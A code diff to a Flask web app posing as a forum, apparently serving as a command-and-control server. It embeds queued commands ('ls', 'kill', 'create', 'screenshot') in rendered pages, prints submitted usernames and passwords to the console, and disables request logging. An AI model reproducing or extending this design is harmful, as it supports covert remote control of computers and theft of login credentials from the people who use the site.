@@ -1,8 +1,17 @@
-from flask import Flask, render_template, url_for
+from flask import Flask, render_template, url_for, request, redirect
 from threading import Thread
+import logging
 
 
-app = Flask(__name__, template_folder="static", static_folder="styles")
+BOLD = "\033[1m"
+RED = "\033[91m"
+BLUE = "\033[94m"
+END = "\033[0m"
+
+
+app = Flask(__name__, template_folder="static", static_folder="static")
+log = logging.getLogger("werkzeug")
+log.disabled = True
 
 commands = list()
 allowed_commands = ["ls", "kill", "create", "screenshot"]
@@ -13,41 +22,59 @@ def get_command():
     cmd = commands.pop(0)
     return cmd
 
+def handle_post(request):
+    data = request.get_data()
+    temp = data.decode("ascii").split("&")
+    data = dict()
+    for e in temp:
+        key, value = e.split("=")
+        data[key.lower()] = value
+    print(f'{BOLD + RED}Data Received!!\n{BLUE}...{data}{END}')
+    return data
+
 
 
 @app.route("/", methods=["GET"])
 @app.route("/home", methods=["GET"])
 def home():
     return render_template("home.html", 
-                        MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="menubar.css")), 
-                        STYLE=url_for('static', filename="base.css"),
+                        MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
+                        STYLE=url_for('static', filename="styles/base.css"), 
                         COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else ""
                         )
 
 
-
-
 @app.route("/login", methods=["GET", "POST"])
 def login():
-    return render_template("home.html", 
-                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="menubar.css")), 
-                            STYLE=url_for('static', filename="base.css"),
-                            COMMANDS=render_template("base.html", COMMANDS=get_command()) if len(commands) > 0 else "",
+    if request.method == "POST":
+        handle_post(request)
+        return redirect("/profile", code=302)
+    else:
+        return render_template("home.html", 
+                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
+                            STYLE=url_for('static', filename="styles/base.css"),
+                            COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                             ADD=render_template("form.html",
                                 CLASS="formLogin",
+                                ACTION="/login",
                                 CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                         + render_template("form_input.html", LABEL="Password", TYPE="password")
                             )
                         )
 
+
 @app.route("/signin", methods=["GET", "POST"])
 def signin():
+    if request.method == "POST":
+        handle_post(request)
+        return redirect("/profile", code=302)
     return render_template("home.html", 
-                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="menubar.css")), 
-                            STYLE=url_for('static', filename="base.css"),
-                            COMMANDS=render_template("base.html", COMMANDS=get_command()) if len(commands) > 0 else "",
+                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
+                            STYLE=url_for('static', filename="styles/base.css"),
+                            COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                             ADD=render_template("form.html",
                                 CLASS="formLogin",
+                                ACTION="/signin",
                                 CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                         + render_template("form_input.html", LABEL="Password", TYPE="password")
                                         + render_template("form_input.html", LABEL="Password confirmation", TYPE="password")
@@ -55,16 +82,27 @@ def signin():
                         )
 
 
-@app.route("/logout", methods=["GET", "POST"])
-
-
-@app.route("/forum", methods=["GET"])
 @app.route("/profile", methods=["GET"])
 @app.route("/profile/<user_id>", methods=["GET"])
+def profile():
+    return render_template("home.html",
+                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
+                            STYLE=url_for('static', filename="styles/base.css"),
+                            COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
+                            ADD=render_template("profile.html", )
+                            )
+
+
+@app.route("/logout", methods=["GET"])
+
+@app.route("/forum", methods=["GET"])
+
 @app.route("/forum/post", methods=["GET", "POST"])
 @app.route("/forum/post/<post_id>", methods=["GET", "POST"])
 def test():
     return "Hello World!"
+
+
 
 
 
